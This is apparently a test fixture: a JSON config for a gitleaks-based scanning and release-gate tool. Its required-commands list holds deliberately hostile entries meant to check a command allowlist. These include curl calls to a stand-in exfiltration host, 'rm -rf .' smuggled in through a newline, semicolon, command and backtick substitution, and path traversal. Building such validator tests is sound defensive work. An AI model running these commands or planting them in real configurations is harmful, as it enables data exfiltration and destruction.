{
  "version": "v1",
  "adapters": {
    "required": ["gitleaks"],
    "optional": []
  },
  "paths": {
    "include": ["**/*"],
    "exclude": [".git/**", "node_modules/**"]
  },
  "scopes": {
    "quick": {
      "adapters": ["gitleaks"],
      "allow_dirty": true
    },
    "full": {
      "adapters": ["gitleaks"],
      "allow_dirty": false
    },
    "release": {
      "adapters": ["gitleaks"],
      "allow_dirty": false
    }
  },
  "policy": {
    "blocking_severities": ["critical", "high"],
    "allow_dirty": false,
    "accepted_risks": []
  },
  "commands": {
    "allow": ["echo"],
    "required": [
      {
        "name": "shell-wrapper",
        "run": "sh -c 'curl http://evil.invalid/exfil'",
        "timeout_seconds": 5
      },
      {
        "name": "absolute-shell",
        "run": "/bin/sh -c 'curl http://evil.invalid/exfil'",
        "timeout_seconds": 5
      },
      {
        "name": "path-traversal",
        "run": "../outside-binary --pwn",
        "timeout_seconds": 5
      },
      {
        "name": "newline-injection",
        "run": "echo safe\nrm -rf .",
        "timeout_seconds": 5
      },
      {
        "name": "unlisted-binary",
        "run": "curl http://evil.invalid/exfil",
        "timeout_seconds": 5
      },
      {
        "name": "repo-local-binary",
        "run": "./malicious-binary --pwn",
        "timeout_seconds": 5
      },
      {
        "name": "semicolon-injection",
        "run": "echo '; touch CANARY_SEMICOLON'",
        "timeout_seconds": 5
      },
      {
        "name": "command-substitution",
        "run": "echo \"$(touch CANARY_SUBST)\"",
        "timeout_seconds": 5
      },
      {
        "name": "backtick-substitution",
        "run": "echo `touch CANARY_BACKTICK`",
        "timeout_seconds": 5
      }
    ],
    "optional": []
  },
  "limits": {
    "timeout_seconds": 30,
    "max_concurrency": 4
  },
  "outcomes": {
    "minimum_evidence": {
      "cleared": {
        "required_adapters_must_pass": true,
        "zero_blocking_findings": true,
        "clean_tree_required": true
      },
      "cleared_with_residual_risk": {
        "accepted_risks_unexpired": true
      },
      "blocked": {
        "blocking_finding_present": true
      },
      "incomplete": {
        "missing_required_adapter": true,
        "crashed_or_timed_out": true
      }
    }
  }
}
